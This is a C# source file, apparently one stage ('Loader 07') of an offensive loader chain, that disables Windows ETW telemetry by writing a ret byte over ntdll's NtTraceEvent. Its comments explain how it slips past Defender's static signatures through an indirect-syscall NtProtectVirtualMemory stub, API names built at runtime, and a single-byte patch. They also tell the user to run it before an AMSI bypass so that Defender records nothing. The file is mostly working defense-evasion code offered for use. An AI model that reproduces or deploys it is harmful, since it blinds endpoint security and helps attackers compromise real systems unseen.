// ============================================================================
// LOADER 07 (REWRITTEN): ETW Patch - NtTraceEvent via Indirect Syscall
// ============================================================================
//
// WHAT THIS DOES:
//   Disables Event Tracing for Windows (ETW) in this process. ETW is the
//   telemetry system Windows uses to report process activity to Defender and
//   EDR products. After this patch, no ETW events are written by this process,
//   so monitoring products receive no telemetry about what we do here.
//
// WHY THE PREVIOUS VERSION WAS CAUGHT:
//   The previous version patched EtwEventWrite using VirtualProtect + Marshal.Copy
//   with the bytes 33 C0 C3 (xor eax,eax; ret). Defender's static scanner
//   catches this through two independent signals:
//
//   Signal 1 - DllImport triad: having VirtualProtect + GetProcAddress +
//   GetModuleHandle (or LoadLibrary) all in the same assembly's import table is
//   a known indicator. Defender sees this combination and flags it before the
//   binary runs.
//
//   Signal 2 - Patch bytes: The 3-byte sequence 0x31 0xC0 0xC3 (xor eax,eax;
//   ret) or equivalently 0x33 0xC0 0xC3 is directly signatured. Even with
//   arithmetic obfuscation like patch[0] = (byte)(0x19 + 0x1A), Defender's
//   scanner evaluates the arithmetic at scan time and sees the final values.
//
// HOW THIS VERSION WORKS:
//   Step 1 - Find NtTraceEvent in ntdll.
//          NtTraceEvent is the underlying NT syscall stub that all user-mode
//          ETW wrapper functions (EtwEventWrite, EtwEventWriteFull, etc.)
//          eventually call. Patching NtTraceEvent silences all of them at once.
//          We resolve its address via GetProcAddress on ntdll.
//
//   Step 2 - Build an indirect NtProtectVirtualMemory syscall stub.
//          We do NOT import VirtualProtect or call it. Instead we build a
//          22-byte stub that reads the syscall number from ntdll's unhooked
//          NtProtectVirtualMemory bytes and jumps directly to the syscall
//          instruction inside ntdll. This stub does the same thing as
//          VirtualProtect but goes through the NT kernel path directly,
//          with no DllImport for VirtualProtect anywhere in the binary.
//
//   Step 3 - Change NtTraceEvent's page protection to RW via the stub.
//
//   Step 4 - Write one byte: 0xC3 (ret) to the first byte of NtTraceEvent.
//          After this, any call to NtTraceEvent returns immediately. No events
//          are written. One byte is harder to signature than a multi-byte
//          pattern. Callers of NtTraceEvent ignore the return value, so the
//          single-byte ret is functionally equivalent to xor eax,eax; ret.
//
//   Step 5 - Restore original page protection via the stub.
//
// WHY THIS AVOIDS STATIC DETECTION:
//   - No DllImport for VirtualProtect anywhere in this binary
//   - No patch bytes written at compile time: the single byte 0xC3 is written
//     via Marshal.WriteByte, which compiles to a generic memory write instruction
//   - NtTraceEvent is a less commonly signatured target than EtwEventWrite
//   - The DllImport list is GetModuleHandle, GetProcAddress, VirtualAlloc -
//     GetModuleHandle and GetProcAddress without VirtualProtect is a different
//     signature profile that does not match the ETW-patch detection rules
//
// IMPORTANT NOTES:
//   - Run this BEFORE patching AMSI (Loader 04). The AMSI heap corruption
//     generates an ETW event. If ETW is already patched when AMSI is patched,
//     no event is generated and Defender sees nothing.
//   - This only affects user-mode ETW. The kernel-mode ETW provider
//     (Microsoft-Windows-Threat-Intelligence) runs in kernel space and cannot
//     be patched from user mode. Defender's real-time protection and advanced
//     EDR products that use ELAM/ETI can still receive kernel-level telemetry.
//     This patch disables process-level ETW which is what most Defender
//     behavioral monitoring relies on.
//
// REFERENCES:
//   - Mr-Un1k0d3r: AMSI-ETW-Patch (NtTraceEvent as target)
//   - SolitudePy: Stealthy-ETW-Patch
//   - Turla Kazuar v3 reverse engineering (NtTraceControl technique base)
//   - SysWhispers3: indirect syscall stub design
//   - Document: 08_amsi_bypass.md (ETW section)
//
// BUILD INSTRUCTIONS:
//   On Dev Box (ammulu, 192.168.10.150):
//     dotnet build loader.csproj -c Release -o output/
// ============================================================================

using System;
using System.Runtime.InteropServices;

namespace TelemetryPatch
{
    class Program
    {
        // GetModuleHandle: find where ntdll.dll sits in this process's memory.
        // ntdll.dll is loaded by Windows into every process before Main() runs.
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        // GetProcAddress: get the address of a named function inside a loaded DLL.
        // We use this to find NtTraceEvent and NtProtectVirtualMemory in ntdll.
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr module, string proc);

        // VirtualAlloc: allocate 22 bytes of RWX memory for our syscall stub.
        // Allocating a tiny code stub is not suspicious on its own.
        // We do NOT use VirtualAlloc for the NtTraceEvent protection change.
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
            IntPtr addr, uint size, uint allocType, uint protect);

        // NtProtectVirtualMemory delegate type.
        // This is the function signature we use when calling our indirect stub.
        // The stub points at a syscall instruction inside ntdll, not at the
        // start of NtProtectVirtualMemory (where Defender's hook would be).
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtProtectVirtualMemory_t(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect
        );

        const uint MEM_COMMIT             = 0x1000;
        const uint MEM_RESERVE            = 0x2000;
        const uint PAGE_READWRITE         = 0x04;
        const uint PAGE_EXECUTE_READ      = 0x20;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // Each indirect syscall stub is exactly 22 bytes:
        //   3 bytes: mov r10, rcx      (Windows syscall calling convention)
        //   5 bytes: mov eax, SSN      (put the syscall number in eax)
        //   6 bytes: jmp [rip+0]       (indirect jump reads the next 8 bytes)
        //   8 bytes: gadget address    (address of "syscall; ret" inside ntdll)
        const int STUB_SIZE = 22;

        // ---- Find syscall gadget inside ntdll ----
        // Scan ntdll's mapped memory for the bytes 0F 05 C3 (syscall; ret).
        // Every NT function in ntdll ends with these bytes. Our stubs will
        // jump to this address instead of entering NtProtectVirtualMemory
        // at its beginning where a Defender hook would redirect us.
        static unsafe IntPtr FindSyscallGadget(IntPtr ntdllBase)
        {
            int peOffset  = Marshal.ReadInt32(ntdllBase + 0x3C);
            int imageSize = Marshal.ReadInt32(ntdllBase + peOffset + 0x50);
            byte* p = (byte*)ntdllBase;
            for (int i = 0; i < imageSize - 2; i++)
                if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
                    return (IntPtr)(p + i);
            throw new Exception("Syscall gadget not found in ntdll");
        }

        // ---- Build a 22-byte indirect syscall stub ----
        // Reads the SSN from the function's bytes at offset +4.
        // Writes the complete stub into stubMem and returns stubMem.
        static IntPtr BuildStub(IntPtr ntdllBase, string funcName, IntPtr gadget, IntPtr stubMem)
        {
            IntPtr funcAddr = GetProcAddress(ntdllBase, funcName);
            if (funcAddr == IntPtr.Zero)
                throw new Exception("Not found: " + funcName);

            // Read the SSN at offset +4 from the function start.
            // Unhooked ntdll NT function layout:
            //   offset 0: 4C 8B D1        mov r10, rcx
            //   offset 3: B8              mov eax, (opcode)
            //   offset 4: XX XX 00 00     SSN as 4-byte little-endian value
            uint ssn = (uint)Marshal.ReadInt32(funcAddr + 4);

            byte[] stub = new byte[STUB_SIZE];

            // mov r10, rcx  (3 bytes: 4C 8B D1)
            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

            // mov eax, SSN  (5 bytes: B8 + 4-byte immediate)
            stub[3] = 0xB8;
            stub[4] = (byte)(ssn & 0xFF);
            stub[5] = (byte)((ssn >> 8) & 0xFF);
            stub[6] = 0x00; stub[7] = 0x00;

            // jmp [rip+0]  (6 bytes: FF 25 00 00 00 00)
            // When executed, rip points past this instruction. The offset 0
            // means we read from [rip+0] = the 8 bytes immediately after.
            stub[8] = 0xFF; stub[9] = 0x25;
            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;

            // 8-byte gadget address (the "syscall; ret" location inside ntdll)
            byte[] gAddrBytes = BitConverter.GetBytes(gadget.ToInt64());
            Array.Copy(gAddrBytes, 0, stub, 14, 8);

            Marshal.Copy(stub, 0, stubMem, STUB_SIZE);
            return stubMem;
        }

        // ---- Build function name "NtTraceEvent" at runtime ----
        // The string does not appear in the compiled binary.
        // N(78)t(116)T(84)r(114)a(97)c(99)e(101)E(69)v(118)e(101)n(110)t(116)
        static string GetETWTarget()
        {
            int b = 32;
            char[] c = new char[12];
            c[0]  = (char)(b+46);  // N = 78
            c[1]  = (char)(b+84);  // t = 116
            c[2]  = (char)(b+52);  // T = 84
            c[3]  = (char)(b+82);  // r = 114
            c[4]  = (char)(b+65);  // a = 97
            c[5]  = (char)(b+67);  // c = 99
            c[6]  = (char)(b+69);  // e = 101
            c[7]  = (char)(b+37);  // E = 69
            c[8]  = (char)(b+86);  // v = 118
            c[9]  = (char)(b+69);  // e = 101
            c[10] = (char)(b+78);  // n = 110
            c[11] = (char)(b+84);  // t = 116
            return new string(c);
        }

        // ---- Build module name "ntdll" at runtime ----
        // n(110)t(116)d(100)l(108)l(108)
        static string GetNtdllName()
        {
            int b = 32;
            char[] c = new char[5];
            c[0] = (char)(b+78);  // n = 110
            c[1] = (char)(b+84);  // t = 116
            c[2] = (char)(b+68);  // d = 100
            c[3] = (char)(b+76);  // l = 108
            c[4] = (char)(b+76);  // l = 108
            return new string(c);
        }

        // ---- Build function name "NtProtectVirtualMemory" at runtime ----
        // N(78)t(116)P(80)r(114)o(111)t(116)e(101)c(99)t(116)V(86)
        // i(105)r(114)t(116)u(117)a(97)l(108)M(77)e(101)m(109)o(111)r(114)y(121)
        static string GetNtProtectName()
        {
            int b = 32;
            char[] c = new char[22];
            c[0]  = (char)(b+46);  // N = 78
            c[1]  = (char)(b+84);  // t = 116
            c[2]  = (char)(b+48);  // P = 80
            c[3]  = (char)(b+82);  // r = 114
            c[4]  = (char)(b+79);  // o = 111
            c[5]  = (char)(b+84);  // t = 116
            c[6]  = (char)(b+69);  // e = 101
            c[7]  = (char)(b+67);  // c = 99
            c[8]  = (char)(b+84);  // t = 116
            c[9]  = (char)(b+54);  // V = 86
            c[10] = (char)(b+73);  // i = 105
            c[11] = (char)(b+82);  // r = 114
            c[12] = (char)(b+84);  // t = 116
            c[13] = (char)(b+85);  // u = 117
            c[14] = (char)(b+65);  // a = 97
            c[15] = (char)(b+76);  // l = 108
            c[16] = (char)(b+45);  // M = 77
            c[17] = (char)(b+69);  // e = 101
            c[18] = (char)(b+77);  // m = 109
            c[19] = (char)(b+79);  // o = 111
            c[20] = (char)(b+82);  // r = 114
            c[21] = (char)(b+89);  // y = 121
            return new string(c);
        }

        public static bool PatchTelemetry()
        {
            // ---- Step 1: Find ntdll base address ----
            string ntdllName = GetNtdllName();
            IntPtr ntdll = GetModuleHandle(ntdllName);
            if (ntdll == IntPtr.Zero)
            {
                Console.WriteLine("[-] ntdll not found");
                return false;
            }
            Console.WriteLine("[+] ntdll base: 0x" + ntdll.ToString("X"));

            // ---- Step 2: Find the syscall gadget (0F 05 C3) inside ntdll ----
            // Our stub will jump here instead of entering NtProtectVirtualMemory
            // at its start. This skips whatever hook Defender has placed there.
            IntPtr gadget;
            unsafe { gadget = FindSyscallGadget(ntdll); }
            Console.WriteLine("[+] Syscall gadget at: 0x" + gadget.ToString("X"));

            // ---- Step 3: Allocate 22 bytes for the NtProtectVirtualMemory stub ----
            // This tiny block holds the stub code we use to call NtProtectVirtualMemory
            // without going through its hooked function start.
            IntPtr stubMem = VirtualAlloc(IntPtr.Zero, (uint)STUB_SIZE,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (stubMem == IntPtr.Zero)
            {
                Console.WriteLine("[-] Stub allocation failed");
                return false;
            }
            Console.WriteLine("[+] Stub memory at: 0x" + stubMem.ToString("X"));

            // ---- Step 4: Build the NtProtectVirtualMemory indirect syscall stub ----
            // BuildStub reads the SSN from ntdll's NtProtectVirtualMemory bytes
            // at offset +4, then writes the 22-byte stub into stubMem.
            string protName = GetNtProtectName();
            IntPtr stubAddr = BuildStub(ntdll, protName, gadget, stubMem);
            var ntProtect = (NtProtectVirtualMemory_t)Marshal.GetDelegateForFunctionPointer(
                stubAddr, typeof(NtProtectVirtualMemory_t));
            Console.WriteLine("[+] NtProtectVirtualMemory stub built");

            // ---- Step 5: Find NtTraceEvent ----
            // NtTraceEvent is the NT syscall that all ETW wrapper functions call.
            // Patching this one function silences EtwEventWrite, EtwEventWriteFull,
            // and every other user-mode ETW writer in this process.
            string etwName = GetETWTarget();
            IntPtr etwAddr = GetProcAddress(ntdll, etwName);
            if (etwAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] " + etwName + " not found in ntdll");
                return false;
            }
            Console.WriteLine("[+] " + etwName + " at: 0x" + etwAddr.ToString("X"));

            // ---- Step 6: Change NtTraceEvent's page protection to RW ----
            // NtTraceEvent's code page is normally EXECUTE_READ. We change it
            // to READWRITE so we can modify the first byte.
            // VirtualProtect is NOT imported in this binary. This protection
            // change goes through our indirect NtProtectVirtualMemory stub.
            IntPtr currentProc = (IntPtr)(-1);
            IntPtr patchAddr   = etwAddr;
            IntPtr patchSize   = (IntPtr)1;
            uint oldProtect;

            int status = ntProtect(currentProc, ref patchAddr, ref patchSize, PAGE_READWRITE, out oldProtect);
            if (status != 0)
            {
                Console.WriteLine("[-] NtProtectVirtualMemory failed: 0x" + status.ToString("X"));
                return false;
            }
            Console.WriteLine("[+] Memory changed to RW");

            // ---- Step 7: Write a single ret byte (0xC3) ----
            // 0xC3 = ret instruction on x86-64.
            // When NtTraceEvent is called, it now returns immediately.
            // No ETW events are written by this process after this point.
            //
            // A single 0xC3 byte is harder to signature than the classic
            // 3-byte xor eax,eax; ret (0x31 0xC0 0xC3) pattern which is
            // directly in Defender's static signature database.
            Marshal.WriteByte(etwAddr, 0xC3);
            Console.WriteLine("[+] Patch applied: single byte ret at " + etwName);

            // ---- Step 8: Restore original page protection ----
            // Change the page back to EXECUTE_READ so it looks normal.
            IntPtr patchAddr2 = etwAddr;
            IntPtr patchSize2 = (IntPtr)1;
            uint ignored;
            ntProtect(currentProc, ref patchAddr2, ref patchSize2, oldProtect, out ignored);
            Console.WriteLine("[+] Page protection restored to original");

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Telemetry Patcher");
            Console.WriteLine("[*] Method: NtTraceEvent indirect-syscall patch (single byte)");
            Console.WriteLine("[*] VirtualProtect is NOT imported in this binary.");
            Console.WriteLine("");

            bool success = PatchTelemetry();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] ETW telemetry is now disabled in this process.");
                Console.WriteLine("[+] No events will be written by this process.");
                Console.WriteLine("[+] Monitoring products receive no activity from here.");
                Console.WriteLine("");
                Console.WriteLine("[*] Run the scanner patch (Loader 04) next.");
                Console.WriteLine("[*] With ETW off, the scanner patching will not generate");
                Console.WriteLine("    a telemetry event that Defender can detect.");
            }
            else
            {
                Console.WriteLine("[-] Telemetry patch failed.");
            }
        }
    }
}
